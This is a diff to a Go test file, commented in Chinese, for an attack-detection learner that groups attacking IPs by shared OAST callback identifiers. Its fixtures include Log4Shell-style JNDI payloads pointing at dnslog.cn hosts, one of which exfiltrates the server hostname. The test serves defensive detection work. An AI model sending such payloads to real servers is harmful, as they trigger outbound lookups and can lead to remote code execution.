@@ -126,6 +126,26 @@ func TestCampaignLinksSources(t *testing.T) {
 	if _, ok := l.confirmedSource("198.51.100.9", now); ok {
 		t.Fatal("没有攻击命中的请求不应关联")
 	}
+	// 供攻击活动归并：被多个来源使用过的标识
+	if links := l.OASTLinks(); len(links) != 1 || len(links["dbke9n6cm7of64pa3q20.oast"]) != 3 {
+		t.Fatalf("OAST 关联: %v", links)
+	}
+	// 写死在公开利用脚本里的标识：大量来源长期使用，不能说明是同一个人
+	shared := func(ip string, at time.Time) {
+		l.ObserveAttack(webEv(ip, "GET", "/?q=${jndi:ldap://${hostname}.abcd.dnslog.cn/x}", at), atk)
+	}
+	shared("192.0.2.1", now.Add(-30*24*time.Hour))
+	shared("192.0.2.2", now)
+	for i := range 40 {
+		l.ObserveAttack(webEv("198.18.0."+strconv.Itoa(i+1), "GET", "/?q=${jndi:ldap://x.efgh.dnslog.cn/x}", now), atk)
+	}
+	if links := l.OASTLinks(); len(links) != 1 {
+		t.Fatalf("长期、大量来源使用的标识不参与归并: %v", links)
+	}
+	var nilL *Learner
+	if nilL.OASTLinks() != nil {
+		t.Fatal("未启用自学习时为空")
+	}
 }
 
 // 只出现在已确认攻击源、没有命中任何规则、正常访客从未使用的请求形态：3 个攻击源使用后生成观察规则。
